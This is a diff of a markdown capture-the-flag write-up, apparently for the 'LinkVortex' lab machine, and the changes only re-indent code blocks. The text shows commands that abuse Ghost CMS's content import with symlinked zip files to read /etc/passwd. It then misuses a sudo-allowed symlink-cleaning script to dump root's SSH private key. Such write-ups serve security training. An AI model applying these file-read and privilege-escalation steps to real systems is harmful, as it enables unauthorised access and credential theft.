@@ -23,20 +23,20 @@
 - **Running Services**
   - Command: `nmap -sC -sV 10.10.11.47`
   - Output: 
- ``` 
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
-|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
-80/tcp open  http    Apache httpd
-| http-robots.txt: 4 disallowed entries
-|_/ghost/ /p/ /email/ /r/
-|_http-server-header: Apache
-|_http-generator: Ghost 5.58
-|_http-title: BitByBit Hardware
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-```
+    ``` 
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey:
+    |   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
+    |_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
+    80/tcp open  http    Apache httpd
+    | http-robots.txt: 4 disallowed entries
+    |_/ghost/ /p/ /email/ /r/
+    |_http-server-header: Apache
+    |_http-generator: Ghost 5.58
+    |_http-title: BitByBit Hardware
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+    ```
 - **Add to /etc/hosts**
     - Command: `sudo vim /etc/hosts/`
 
@@ -96,20 +96,20 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 - **Create a symlink to a file for testing**
   - Command `ln -s /etc/passwd exploit/content/images/test-file.png`
   - Zip it 
-    - `zip -r -y exploit.zip exploit/`
+    `zip -r -y exploit.zip exploit/`
 - **Import the zip file to web**
   - Go to Settings > Labs > Import Content
 
 - **Request the file**
   - `curl http://linkvortex.htb/content/images/test-file.png`
   - Output:
-  ```
-  root:x:0:0:root:/root:/bin/bash
-  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-  bin:x:2:2:bin:/bin:/usr/sbin/nologin
-  sys:x:3:3:sys:/dev:/usr/sbin/nologin
-  sync:x:4:65534:sync:/bin:/bin/sync
-  ```
+    ```
+    root:x:0:0:root:/root:/bin/bash
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+    bin:x:2:2:bin:/bin:/usr/sbin/nologin
+    sys:x:3:3:sys:/dev:/usr/sbin/nologin
+    sync:x:4:65534:sync:/bin:/bin/sync
+    ```
 
 ---
 
@@ -149,14 +149,14 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 - **Check for Sudo Rights**
   - Command: `sudo -l`
     - Output: 
-    ```
-    Matching Defaults entries for bob on linkvortex:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/s
-    nap/bin, use_pty, env_keep+=CHECK_CONTENT
-    User bob may run the following commands on linkvortex:
-    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
-    ```
+        ```
+        Matching Defaults entries for bob on linkvortex:
+        env_reset, mail_badpass,
+        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/s
+        nap/bin, use_pty, env_keep+=CHECK_CONTENT
+        User bob may run the following commands on linkvortex:
+        (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
+        ```
 
 - **Check file permissions**
   - Command: `ls -la /opt/ghost/clean_symlink.sh`
@@ -180,7 +180,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 - **Create a symlink to a file for testing**
   - Command `ln -s /ok exploit2/content/images/key.png`
   - Zip it 
-    - `zip -r -y exploit2.zip exploit2/`
+    `zip -r -y exploit2.zip exploit2/`
 - **Import the zip file to web**
   - Go to Settings > Labs > Import Content
 
@@ -192,16 +192,16 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 - **Run the script**
   - `export CHECK_CONTENT=true; sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /opt/ghost/content/images/key.png`
   - Output:
-  ```
+    ```
     Link found [ /opt/ghost/content/images/key.png ] , moving it to quarantine
-  Content:
-  -----BEGIN OPENSSH PRIVATE KEY-----
-  b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-  <...SNIP..>
-  xmo6eXMvU90HVbakUoRspYWISr51uVEvIDuNcZUJlseINXimZkrkD40QTMrYJc9slj9wkA
-  ICLgLxRR4sAx0AAAAPcm9vdEBsaW5rdm9ydGV4AQIDBA==
-  -----END OPENSSH PRIVATE KEY-----
-  ```
+    Content:
+    -----BEGIN OPENSSH PRIVATE KEY-----
+    b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+    <...SNIP..>
+    xmo6eXMvU90HVbakUoRspYWISr51uVEvIDuNcZUJlseINXimZkrkD40QTMrYJc9slj9wkA
+    ICLgLxRR4sAx0AAAAPcm9vdEBsaW5rdm9ydGV4AQIDBA==
+    -----END OPENSSH PRIVATE KEY-----
+    ```
 
 - SSH as root
   - Copy the private key to root
